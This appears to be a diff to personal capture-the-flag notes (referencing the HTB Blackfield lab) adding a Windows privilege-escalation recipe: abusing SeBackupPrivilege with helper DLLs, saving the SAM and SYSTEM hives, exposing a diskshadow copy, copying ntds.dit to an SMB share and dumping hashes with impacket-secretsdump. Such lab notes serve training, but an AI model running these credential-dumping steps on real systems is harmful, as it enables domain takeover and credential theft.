@@ -1364,11 +1364,31 @@ Acl-FullControl -user return\svc-printer -path C:\Users\Administrator # -user <d
 # now we are not NT Authority user, Not working
 impacket-smbserver -smb2support share . # kali command
 copy ntds.dit \\10.10.11.108\Share\ntds.dit # it always used other services can't copy this
-
-
 ```
-
-
+- If you have the SeBackupPrivilege & SeRestorePrivilege enabled then using this [binaries](https://github.com/giuliano108/SeBackupPrivilege),
+- Reference Blackfield-HTB [walkthrough ntds.dit](https://www.secjuice.com/htb-blackfield-walkthrough/)
+```powershell
+import-module .\SeBackupPrivilegeCmdLets.dll
+import-module .\SeBackupPrivilegeUtils.dll
+reg save hklm\sam c:\programdata\sam
+reg save hklm\system c:\programdata\system
+# Using sam and system file I got the admin hash but was not able to log in with impacket-psexec and evil-winrm, So tring dumping ntds.dit
+echo "set context persistent nowriters" | out-file ./cmd -encoding ascii
+echo "add volume c: alias temp" | out-file ./cmd -encoding ascii -append
+echo "create" | out-file ./cmd -encoding ascii -append
+echo "expose %temp% z:" | out-file ./cmd -encoding ascii -append
+cat cmd
+#It will print like this
+set context persistent nowriters
+add volume c: alias temp
+create
+expose %temp% z:
+#END of - It will print like this
+diskshadow.exe /s .\cmd
+Copy-FileSeBackupPrivilege z:\users\administrator\desktop\root.txt C:\temp\not-this\root.txt -Overwrite   #Error
+Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit .\ntds.dit -Overwrite # Got the ntds.dit
+impacket-secretsdump -ntds ntds.dit -system system local  # Got different hash of admin then compared to above loggedin with evil-winrm
+```
 
 ---
 
